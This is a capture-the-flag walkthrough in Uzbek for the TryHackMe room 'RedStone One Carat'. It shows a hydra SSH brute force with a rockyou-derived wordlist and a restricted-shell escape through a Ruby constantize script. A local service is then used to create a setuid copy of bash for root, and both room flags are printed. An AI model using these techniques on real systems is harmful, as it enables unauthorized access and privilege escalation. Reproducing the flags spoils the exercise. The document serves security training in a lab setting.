# RedStone

Room: https://tryhackme.com/room/redstoneonecarat

**Hint:** The password contains "bu".

Parollarni saralab olish uchun buyruq::

```
grep "bu" /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt > bu_passwords.txt
```
BruteForce qilamiz endi SSH parolni topish uchun::
```
╭─akhatkulov@u2s in ~/THM took 1s
╰─λ hydra -l noraj -P bu_passwords.txt ssh://10.10.160.127 -t 16 -v
```
Natija:
```
VERBOSE] Retrying connection for child 1
[22][ssh] host: 10.10.160.127   login: noraj   password: cheeseburger
```

Tizimga kirib oldik, mavjud fayllarni aniqlash:
```
red-stone-one-carat% echo *
bin user.txt
red-stone-one-carat% echo bin/*
bin/rzsh bin/test.rb
red-stone-one-carat% echo .*
.cache .hint.txt .zcompdump.red-stone-one-carat.2757 .zshrc
```
Muammo bor bizda:
```
red-stone-one-carat% ls
zsh: command not found: ls
```
user.txt'ni qo'lga kiritish:
```
red-stone-one-carat% echo $(<user.txt)

THM{3a106092635945849a0fbf7bac92409d}
```

## Privilage Escalation
Bizda mavjud rubl fayl:
```
/home/noraj/bin/test.rb
```

Uning dasturiy kodi:
```
#!/usr/bin/ruby

require 'rails'

if ARGV.size == 3
    klass = ARGV[0].constantize
    obj = klass.send(ARGV[1].to_sym, ARGV[2])
else
    puts File.read(__FILE__)
end
```

Maqsad esa qafasdan chiqish!

Kiritib cheklangan zsh terminaldan zsh terminalga o'tamiz.
```
test.rb Kernel exec '/bin/zsh'
```
Zsh terminaldan esa bashga
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Ichki tarmoqni xolatini ko'rish uchun ushbu koddan foydalanamiz:
```
!#/usr/bin/env ruby

PROC_NET_TCP = '/proc/net/tcp'  # This should always be the same ...

TCP_STATES = { '00' => 'UNKNOWN',  # Bad state ... Impossible to achieve ...
               'FF' => 'UNKNOWN',  # Bad state ... Impossible to achieve ...
               '01' => 'ESTABLISHED',
               '02' => 'SYN_SENT',
               '03' => 'SYN_RECV',
               '04' => 'FIN_WAIT1',
               '05' => 'FIN_WAIT2',
               '06' => 'TIME_WAIT',
               '07' => 'CLOSE',
               '08' => 'CLOSE_WAIT',
               '09' => 'LAST_ACK',
               '0A' => 'LISTEN',
               '0B' => 'CLOSING' } # Not a valid state ...

if $0 == __FILE__

  STDOUT.sync = true
  STDERR.sync = true

  File.open(PROC_NET_TCP).each do |i|

    i = i.strip

    next unless i.match(/^\d+/)

    i = i.split(' ')

    local, remote, state = i.values_at(1, 2, 3)

    local_IP, local_port   = local.split(':').collect { |i| i.to_i(16) }
    remote_IP, remote_port = remote.split(':').collect { |i| i.to_i(16) }

    connection_state = TCP_STATES.fetch(state)

    local_IP  = [local_IP].pack('N').unpack('C4').reverse.join('.')
    remote_IP = [remote_IP].pack('N').unpack('C4').reverse.join('.')

      puts "#{local_IP}:#{local_port} " +
        "#{remote_IP}:#{remote_port} #{connection_state}"
  end

  exit(0)
end
```

Bu kodni to'g'ridan to'g'ri yoza olmaymiz shu uchun base64dan foydalanamiz.
Kompyuterimizga netstat.rb faylini yaratamiz va uni cat qilib base64ga o'tqazamiz:
```
cat netstat.rb | base64 -w 0
```
Natija:
```
ISMvdXNyL2Jpbi9lbnYgcnVieQoKUFJPQ19ORVRfVENQID0gJy9wcm9jL25ldC90Y3AnICAjIFRoaXMgc2hvdWxkIGFsd2F5cyBiZSB0aGUgc2FtZSAuLi4KClRDUF9TVEFURVMgPSB7ICcwMCcgPT4gJ1VOS05PV04nLCAgIyBCYWQgc3RhdGUgLi4uIEltcG9zc2libGUgdG8gYWNoaWV2ZSAuLi4KICAgICAgICAgICAgICAgJ0ZGJyA9PiAnVU5LTk9XTicsICAjIEJhZCBzdGF0ZSAuLi4gSW1wb3NzaWJsZSB0byBhY2hpZXZlIC4uLgogICAgICAgICAgICAgICAnMDEnID0+ICdFU1RBQkxJU0hFRCcsCiAgICAgICAgICAgICAgICcwMicgPT4gJ1NZTl9TRU5UJywKICAgICAgICAgICAgICAgJzAzJyA9PiAnU1lOX1JFQ1YnLAogICAgICAgICAgICAgICAnMDQnID0+ICdGSU5fV0FJVDEnLAogICAgICAgICAgICAgICAnMDUnID0+ICdGSU5fV0FJVDInLAogICAgICAgICAgICAgICAnMDYnID0+ICdUSU1FX1dBSVQnLAogICAgICAgICAgICAgICAnMDcnID0+ICdDTE9TRScsCiAgICAgICAgICAgICAgICcwOCcgPT4gJ0NMT1NFX1dBSVQnLAogICAgICAgICAgICAgICAnMDknID0+ICdMQVNUX0FDSycsCiAgICAgICAgICAgICAgICcwQScgPT4gJ0xJU1RFTicsCiAgICAgICAgICAgICAgICcwQicgPT4gJ0NMT1NJTkcnIH0gIyBOb3QgYSB2YWxpZCBzdGF0ZSAuLi4KCmlmICQwID09IF9fRklMRV9fCgogIFNURE9VVC5zeW5jID0gdHJ1ZQogIFNUREVSUi5zeW5jID0gdHJ1ZQoKICBGaWxlLm9wZW4oUFJPQ19ORVRfVENQKS5lYWNoIGRvIHxpfAoKICAgIGkgPSBpLnN0cmlwCgogICAgbmV4dCB1bmxlc3MgaS5tYXRjaCgvXlxkKy8pCgogICAgaSA9IGkuc3BsaXQoJyAnKQoKICAgIGxvY2FsLCByZW1vdGUsIHN0YXRlID0gaS52YWx1ZXNfYXQoMSwgMiwgMykKCiAgICBsb2NhbF9JUCwgbG9jYWxfcG9ydCAgID0gbG9jYWwuc3BsaXQoJzonKS5jb2xsZWN0IHsgfGl8IGkudG9faSgxNikgfQogICAgcmVtb3RlX0lQLCByZW1vdGVfcG9ydCA9IHJlbW90ZS5zcGxpdCgnOicpLmNvbGxlY3QgeyB8aXwgaS50b19pKDE2KSB9CgogICAgY29ubmVjdGlvbl9zdGF0ZSA9IFRDUF9TVEFURVMuZmV0Y2goc3RhdGUpCgogICAgbG9jYWxfSVAgID0gW2xvY2FsX0lQXS5wYWNrKCdOJykudW5wYWNrKCdDNCcpLnJldmVyc2Uuam9pbignLicpCiAgICByZW1vdGVfSVAgPSBbcmVtb3RlX0lQXS5wYWNrKCdOJykudW5wYWNrKCdDNCcpLnJldmVyc2Uuam9pbignLicpCgogICAgICBwdXRzICIje2xvY2FsX0lQfToje2xvY2FsX3BvcnR9ICIgKwogICAgICAgICIje3JlbW90ZV9JUH06I3tyZW1vdGVfcG9ydH0gI3tjb25uZWN0aW9uX3N0YXRlfSIKICBlbmQKCiAgZXhpdCgwKQplbmQ=
```

Endi buni bu buyruq orqali serverga yozamiz.

```
echo "base64_qilingan_kod" | base64 -d > netstat.rb
```
Ishga tushirish:
```
ruby netstat.rb 
```

Natija:
```
127.0.0.53:53 0.0.0.0:0 LISTEN
0.0.0.0:22 0.0.0.0:0 LISTEN
127.0.0.1:31547 0.0.0.0:0 LISTEN
10.10.205.76:22 10.21.147.133:53400 ESTABLISHED
```
endi topilgan 31547 portga ulanamiz va bash yaratamiz:
```
red-stone-one-carat% nc 127.0.0.1 31547
$ exec %q!cp /bin/bash /tmp/bash; chmod +s /tmp/bash!
```
Yaratgan bashimizni ishga tushiramiz:
```
red-stone-one-carat% /tmp/bash -p
bash-4.4# whoami
root
```
root.txt'ni qo'lga kiritish:
```
bash-4.4# cat /root/root.txt 
THM{58e53d1324eef6265fdb97b08ed9aadf}
```